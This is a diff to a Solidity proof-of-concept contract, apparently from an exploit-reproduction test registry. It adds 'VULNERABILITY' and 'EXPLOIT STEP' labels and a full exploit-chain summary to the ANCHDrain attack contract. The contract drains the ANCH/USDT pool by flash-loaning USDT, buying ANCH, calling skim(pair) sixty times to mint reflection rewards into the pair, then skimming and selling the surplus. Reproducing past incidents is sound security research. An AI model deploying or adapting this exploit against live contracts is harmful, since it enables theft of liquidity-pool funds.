@@ -13,7 +13,7 @@ pragma solidity ^0.8.10;
 // imports so it compiles anywhere), compiled inside the registry forge project.
 // Logic and constants are copied verbatim from test/ANCH_exp.sol.
 //
-// Root cause: ANCHToken is a reflection token that pays a 0.05% "transaction
+// VULNERABILITY: ANCHToken is a reflection token that pays a 0.05% "transaction
 // reward" on every transfer where one endpoint is the ANCH/USDT pair
 // (`sender == uniswapV2Pair` ⇒ "buy"; `recipient == uniswapV2Pair` ⇒ "sell"),
 // minting the reward out of the contract's own reflection balance. The reward
@@ -26,6 +26,15 @@ pragma solidity ^0.8.10;
 // the pair (its balance ratchets up while the reserve never changes). One final
 // `skim(attacker)` sweeps the inflated surplus out, which is then sold back to
 // the pair for ~526 USDT of pure pool liquidity.
+//
+// EXPLOIT CHAIN (full):
+// 0. Flash-loan USDT.
+// 1. buyANCH() → acquire ANCH (pair endpoint triggers reward path).
+// 2. transfer(ANCH to pair) → balanceOf(pair) > reserves (surplus created).
+// 3. 60× skim(pair) → each is pair→pair transfer → mints reward to pair.
+// 4. skim(attacker) → extract inflated ANCH.
+// 5. sellANCH() → convert to USDT profit.
+// 6. repay flashloan.
 
 interface IERC20 {
     function balanceOf(address) external view returns (uint256);
@@ -67,19 +76,22 @@ contract ANCHDrain {
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-        // 1. Buy ANCH with the flash-loaned USDT (also collects a buy reward).
+        // VULNERABILITY: see header + ANCHToken.sol. Reward path triggered by endpoint
+        // identity alone; skim(pair) is a pair→pair transfer that satisfies sender==pair.
+
+        // EXPLOIT STEP 1: Buy ANCH with the flash-loaned USDT (also collects a buy reward).
         buyANCH();
-        // 2. Dump all bought ANCH into the pair, creating a balance > reserve surplus.
+        // EXPLOIT STEP 2: Dump all bought ANCH into the pair, creating a balance > reserve surplus.
         ANCH.transfer(address(Pair), ANCH.balanceOf(address(this)));
-        // 3. skim(pair) × 60: each transfers the surplus pair→pair (sender == pair),
+        // EXPLOIT STEP 3: skim(pair) × 60: each transfers the surplus pair→pair (sender == pair),
         //    so ANCHToken mints a 0.05% reward into the pair out of thin air — the
         //    surplus (and so every subsequent reward) grows ~123.99 ANCH per call.
         for (uint256 index = 0; index < 60; index++) {
             Pair.skim(address(Pair));
         }
-        // 4. skim(this): sweep the entire inflated surplus to the attacker contract.
+        // EXPLOIT STEP 4: skim(this): sweep the entire inflated surplus to the attacker contract.
         Pair.skim(address(this));
-        // 5. Sell the inflated ANCH back to the pair for USDT, then repay the loan.
+        // EXPLOIT STEP 5: Sell the inflated ANCH back to the pair for USDT, then repay the loan.
         sellANCH();
         USDT.transfer(DODO, 50_000 * 1e18);
     }
